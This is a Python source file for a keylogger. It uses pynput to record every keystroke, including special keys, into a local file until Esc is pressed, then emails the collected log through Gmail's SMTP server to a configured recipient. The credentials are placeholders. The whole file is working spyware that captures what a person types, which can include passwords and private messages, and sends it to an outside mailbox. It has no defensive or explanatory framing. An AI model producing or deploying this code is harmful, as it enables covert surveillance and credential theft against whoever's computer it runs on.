from pynput import keyboard
import smtplib, ssl

# Email configuration
sender_email = "your_email@gmail.com"
receiver_email = "recipient_email@gmail.com"
password = "your_password"
port = 587

# Initialize an empty string to store keystrokes
logged_keys = " "

# Function to write logged keys to a file
def write_to_file(text):
    with open("keylogger.txt", 'a') as log_file:
        log_file.write(text)

# Function triggered on key press
def on_key_press(key):
    try:
        # If key is Enter, write a new line
        if key == keyboard.Key.enter:
            write_to_file("\n")
        else:
            # Write the pressed key to the log file
            write_to_file(key.char)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.backspace:
            write_to_file("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write_to_file("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            write_to_file(" ")
        else:
            # Log other keys
            temp = repr(key) + " Pressed.\n"
            write_to_file(temp)

# Function triggered on key release
def on_key_release(key):
    # Exit the keylogger on pressing 'esc'
    if key == keyboard.Key.esc:
        return False

# Listen to key presses and releases
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Read logged keys from the file
with open("keylogger.txt", 'r') as log_file:
    logged_keys = log_file.read()

# Construct the email message
message = f"""\
From: {sender_email}
To: {receiver_email}
Subject: KeyLogs

Text: Keylogs
{logged_keys}
"""

# Send the email securely using SMTP
context = ssl.create_default_context()
with smtplib.SMTP('smtp.gmail.com', port) as server:
    try:
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        print("Email Sent to", receiver_email)
    except Exception as e:
        print(f"An error occurred: {e}")
